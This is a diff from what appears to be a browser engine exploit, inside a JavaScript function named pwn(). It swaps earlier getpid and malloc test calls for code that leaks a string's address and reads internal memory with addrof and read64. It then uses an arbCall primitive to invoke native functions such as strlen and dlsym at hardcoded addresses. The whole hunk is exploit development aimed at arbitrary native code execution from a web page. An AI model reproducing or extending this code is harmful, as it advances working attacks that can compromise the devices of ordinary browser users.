@@ -403,13 +403,31 @@ function pwn() {
         return arrayView.getBigUint64(0x8, true);
     }
     
-    //arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
+    let testString = "exit\0\0\0\0";
+    let testStringAddr = addrof(testString);
     
-    let pid = arbCall(0x1babf715c); // getpid()
-    log(`[+] pid = ${pid}`);
-    alert(`[+] pid = ${pid}`);
+    log(`[+] testStringAddr = 0x${testStringAddr.toString(16)}`);
     
-    let buf = arbCall(0x1918c5280, 10); // malloc(10)
-    log(`[+] buf = 0x${buf.toString(16)}`);
-    alert(`[+] buf = 0x${buf.toString(16)}`);
+    let testAddr = read64(testStringAddr + 0x8)
+    
+    log(`[+] testAddr = 0x${testAddr.toString(16)}`);
+
+    log(`[+] 0x${read64(testAddr + 20).toString(16)}`);
+    
+    // call strlen
+    alert(`[+] strlen ret = ${arbCall(0x1daf7af20, testAddr + 20)}`);
+    
+    // call dlsym
+    alert(`[+] dlsym ret = 0x${arbCall(0x18039e2b8, -2, testAddr + 20).toString(16)}`);
+    
+//
+//    //arbCall(0x4142434445464748n, 0x41n, 0x42n, 0x43n, 0x44n, 0x45n, 0x46n, 0x47n, 0x48n, 0x49n);
+//    
+//    let pid = arbCall(0x1babf715c); // getpid()
+//    log(`[+] pid = ${pid}`);
+//    alert(`[+] pid = ${pid}`);
+//    
+//    let buf = arbCall(0x1918c5280, 10); // malloc(10)
+//    log(`[+] buf = 0x${buf.toString(16)}`);
+//    alert(`[+] buf = 0x${buf.toString(16)}`);
 }
